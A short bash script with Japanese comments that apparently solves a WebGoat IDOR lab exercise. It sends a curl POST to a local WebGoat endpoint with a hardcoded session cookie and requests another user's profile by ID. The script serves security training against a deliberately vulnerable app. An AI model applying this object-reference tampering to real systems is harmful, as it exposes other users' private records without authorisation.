#!/bin/bash

JSESSIONID=zxmTu1Ab0kLT6JRTWh5TCkALeR3dsoI7YhubV0mX

# curlコマンドでリクエストを送信
response=$(curl -i -o response.txt -w "%{http_code}" \
  -X POST \
  http://localhost:8080/WebGoat/IDOR/profile/alt-path \
  -H "Cookie: JSESSIONID=$JSESSIONID;" \
  --data "url=WebGoat%2FIDOR%2Fprofile%2F2342384")


# レスポンスコードを表示
echo "HTTP Status Code: $response"

# レスポンスボディを表示
echo "Response Body:"
cat response.txt

